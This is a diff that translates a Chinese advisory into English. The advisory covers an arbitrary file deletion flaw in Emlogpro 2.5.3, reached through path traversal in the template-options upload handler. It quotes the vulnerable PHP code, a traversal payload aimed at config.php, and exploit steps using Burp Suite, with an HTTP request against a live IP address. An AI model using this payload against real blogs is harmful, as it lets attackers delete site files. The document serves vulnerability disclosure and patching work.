@@ -1,36 +1,40 @@
+Here's the translation of your text to English while keeping the markdown format unchanged:
 
-## Emlogpro 2.5.3任意文件删除漏洞
-EMLOG 是一款轻量级开源博客和CMS建站系统，速度快、省资源、易上手，适合各种规模的站点搭建。
+---
 
-Emlogpro 最新版本 2.5.3中存在一个严重漏洞，漏洞文件：`content\plugins\tpl_options\actions\tpl.php`存在路径穿越以及参数可控导致任意文件删除
+## Emlogpro 2.5.3 Arbitrary File Deletion Vulnerability
 
-### 解决建议
-建议您更新当前系统或软件至最新版，完成漏洞的修复。
+EMLOG is a lightweight open-source blogging and CMS building system that is fast, resource-efficient, and easy to use, making it suitable for websites of various sizes.
 
-### 漏洞分析
-`content\plugins\tpl_options\actions\tpl.php`漏洞文件如下
+A serious vulnerability exists in the latest version 2.5.3 of Emlogpro, where the file `content\plugins\tpl_options\actions\tpl.php` has path traversal and parameter control, allowing arbitrary file deletion.
+
+### Solution Recommendation
+It is recommended to update your current system or software to the latest version to fix this vulnerability.
+
+### Vulnerability Analysis
+The vulnerable file `content\plugins\tpl_options\actions\tpl.php` is as follows:
 ```php
 <?php
 /*
  * Author: Vaimibao-曦颜XY
- * Description: 模板设置插件AJAX处理。
+ * Description: Template setting plugin AJAX handler.
 */
 
 require_once '../../../../init.php';
 
 if (!User::isAdmin()) {
-    echo '权限不足！';
+    echo 'Insufficient permissions!';
     exit;
 }
 
-//处理AJAX action
+// Handle AJAX action
 $action = Input::postStrVar('action', '');
 if (!isset($action)) {
-    echo '操作失败，请刷新网页！';
+    echo 'Operation failed, please refresh the page!';
     exit;
 }
 
-//处理AJAX请求
+// Handle AJAX request
 if ($action === 'tpl_upload') {
     $origin_image = Input::postStrVar('origin_image', '');
     $ret = uploadCropImg();
@@ -38,12 +42,12 @@ if ($action === 'tpl_upload') {
     $abs_file_path = '';
     $abs_file_path = strstr($file_path, 'content/uploadfile/');
     if ($abs_file_path === false) {
-        echo '{"code":"error","data":"文件上传出错"}';
+        echo '{"code":"error","data":"File upload failed"}';
         exit;
     }
     $abs_file_path = BLOG_URL . $abs_file_path;
 
-    //删除旧图
+    // Delete old image
     if (!empty(trim($origin_image)) && strpos($origin_image, 'uploadfile') !== false) {
         $path = '../../../../' . str_replace(BLOG_URL, '', $origin_image);
         if (file_exists($path)) {
@@ -62,34 +66,36 @@ if ($action === 'tpl_upload') {
     }
 }
 ```
-主要作用是上传新的图片并删除老的图片
+The main function of this code is to upload new images and delete old ones.
 
-代码中我们可控`origin_image`，也就是老图片的路径，最后unlink的path是拼接出来的，并且有if条件
+We can control the `origin_image`, which refers to the old image path. The final `unlink` path is constructed with the following condition:
 ```r
 if (!empty(trim($origin_image)) && strpos($origin_image, 'uploadfile') !== false)
 ```
-我们路径必须含有`uploadfile`，最后会被拼接
+The path is then concatenated with:
 ```r
 $path = '../../../../' . str_replace(BLOG_URL, '', $origin_image);
 ```
-那么我们就可以通过路径穿越来任删除意文件比如：config.php
+So, we can use path traversal to delete arbitrary files, such as `config.php`:
 ```r
 http://localhost/content/uploadfile/../../config.php
 ```
 
-### 搭建到服务器上攻击
+### Attacking the Server
 
-先进入容器在app目录创建一个file.txt(等会利用漏洞任意文件删除这个文件)
+First, create a `file.txt` in the app directory of the container (which will be deleted later using the vulnerability).
 ![png](./1.png)
-管理员用户登录
-点击外观->模板->在默认模板中点击头部设置->选择任意图片上传
+
+Log in as an administrator.
+Click on Appearance -> Template -> Click on the Header Settings of the Default Template -> Upload any image.
 ![png](./2.png)
-brup抓包后只用将origin_image更改为poc:
+
+Intercept the request using Burp Suite and change the `origin_image` to the exploit URL:
 ```r
 http://124.220.37.173:8000/content/uploadfile/../../file.txt
 ```
 
-完整http报文
+Complete HTTP request:
 ```http
 POST /content/plugins/tpl_options/actions/tpl.php HTTP/1.1
 Host: 124.220.37.173:8000
@@ -124,8 +130,10 @@ http://124.220.37.173:8000/content/uploadfile/../../file.txt
 
 ```
 
-截图：
+Screenshot:
 ![png](./3.png)
 
-执行后发现成功删除该文件：
+After executing the request, we see that the file was successfully deleted:
 ![png](./4.png)
+
+---
